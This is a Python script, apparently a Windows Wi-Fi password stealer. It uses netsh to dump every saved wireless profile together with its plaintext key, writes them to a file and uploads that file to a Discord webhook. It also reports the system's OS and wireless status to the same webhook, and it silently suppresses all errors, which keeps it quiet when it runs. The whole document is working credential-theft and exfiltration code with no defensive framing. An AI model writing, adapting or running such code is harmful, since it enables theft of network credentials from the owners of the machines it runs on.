import platform
import subprocess
import requests
import re
import os

webhook_url = "YOUR_DISCORD_WEBHOOK_URL"

def check_os():
    return os.name

def check_wireless_interface():

    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True, check=True
        )

        if "There is no wireless interface on the system" in result.stdout:
            return False
        return True

    except subprocess.CalledProcessError as e:
        return False

def get_wifi_profiles():
    try:
        profiles_result = subprocess.run(
            ["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, check=True
        )

        profiles = re.findall(r"All User Profile\s*:\s*(.*)", profiles_result.stdout)
        wifi_credentials = []

        for profile_name in profiles:
            profile_name = profile_name.strip()
            try:
                profile_details_result = subprocess.run(
                    ["netsh", "wlan", "show", "profile", profile_name, "key=clear"],
                    capture_output=True, text=True, check=True
                )

                password_search = re.search(r"Key Content\s*:\s*(.*)", profile_details_result.stdout)
                password = password_search.group(1).strip() if password_search else "No password found"
                
                wifi_credentials.append(f"SSID: {profile_name}, Password: {password}")

            except subprocess.CalledProcessError as e:
                pass

        if wifi_credentials:
            with open("output.txt", "w") as f:
                for info in wifi_credentials:
                    f.write(info + "\n")
            pass

        with open("output.txt", 'rb') as file:
            payload = {'content': 'User network info!'}
            files = {'file': ('output.txt', file, 'text/plain')}
            response = requests.post(webhook_url, data=payload, files=files)
        pass
        pass

    except subprocess.CalledProcessError as e:
        pass
    except Exception as e:
        pass

def send_no_wireless_interface_message():
    payload = {'content': 'There is no wireless interface on the system.'}
    response = requests.post(webhook_url, data=payload)


def start():
    if check_os() == 'nt': 
        if check_wireless_interface():
            get_wifi_profiles()
        else:
            send_no_wireless_interface_message()
    else:
        payload = {'content': 'OS not supported'}
        requests.post(webhook_url, data=payload)

start()
